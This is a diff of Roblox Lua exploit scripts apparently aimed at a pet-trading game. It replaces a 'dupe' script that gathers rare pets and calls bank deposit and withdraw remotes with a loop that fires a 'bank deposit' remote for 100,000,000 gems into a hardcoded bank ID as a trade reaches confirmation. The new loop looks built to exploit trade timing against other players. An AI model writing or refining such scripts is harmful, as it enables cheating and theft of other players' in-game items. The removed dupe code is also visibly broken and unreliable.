@@ -1,23 +1,15 @@
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mybanks = lib.Network.Invoke("get my banks")
-local BankID = mybanks[1]['BUID']
-setclipboard(BankID)
-local PetsList = {}
-for i,v in pairs(lib.Save.Get().Pets) do
-    local v2 = lib.Directory.Pets[v.id];
-    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
-        table.insert(PetsList, v.uid);
+local args = {
+    [1] = {
+        [1] = "7a5fa2e7-a35e-4d6f-8b8f-9592605241c7", -- bank id
+        [2] = {},
+        [3] = 100000000 -- gems amount
+    }
+}
+ 
+while true do
+    if game.Players.LocalPlayer.PlayerGui.Trading.Frame.Trade.Visible == true and game.Players.LocalPlayer.PlayerGui.Trading.Frame.Trade.Notice.Text == '⌛ Trade confirming...' then
+        task.wait(0.7)
+        workspace.__THINGS.__REMOTES:FindFirstChild("bank deposit"):InvokeServer(unpack(args))
     end
+    task.wait()
 end
-local request, request2 = lib.Network.Invoke("Bank Deposit", BankID[1]['BUID'], PetsList - 1);
-if request then
-    lib.Message.New("DUPE IS STARTING");
-else
-    lib.Message.New(request2 and "please be patient!");
-    return;
-end
-if lib.Network.Invoke("Bank Withdraw", mybanks[1]['BUID'], lib) then
-    lib.Message.New("DUPE HAS BEEN SUCCESFULLY INITIATED");
-else
-    lib.Message.New("DUPED FAILED, PLEASE TRY AGAIN.");
-end;
